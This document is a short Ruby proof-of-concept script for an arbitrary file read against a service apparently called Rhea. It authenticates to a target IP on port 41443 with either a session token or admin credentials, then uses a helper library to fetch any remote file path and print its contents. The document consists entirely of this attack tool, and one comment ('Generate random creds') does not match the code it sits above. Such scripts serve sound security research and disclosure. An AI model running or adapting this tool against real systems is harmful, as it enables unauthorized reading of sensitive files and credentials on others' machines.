require './librhea.rb'

if ARGV.length < 3
  $stderr.puts 'Usage:'
  $stderr.puts
  $stderr.puts "ruby rhea-read-arbitrary-file.rb <target ip> <remote file path> [session_token]|[username password]"
  $stderr.puts
  $stderr.puts "You must either specify a session_token, which must be authorized, or a username/password for an admin user"
  exit 1
end

# Set things up
TARGET = ARGV[0]
REMOTE_FILE = ARGV[1]
BASE_URL = "https://#{ARGV[0]}:41443"
puts "Establishing a session on #{BASE_URL}..."

if ARGV.length == 3
  $stderr.puts "Authenticating with session token: #{ARGV[2]}"
  RHEA = LibRhea::new(BASE_URL, token: ARGV[2])
else
  $stderr.puts "Authenticating with username/password: #{ARGV[2]} / #{ARGV[3]}"
  RHEA = LibRhea::new(BASE_URL, username: ARGV[2], password: ARGV[3])
end

# Generate random creds
data = RHEA.read_file(REMOTE_FILE)
puts data
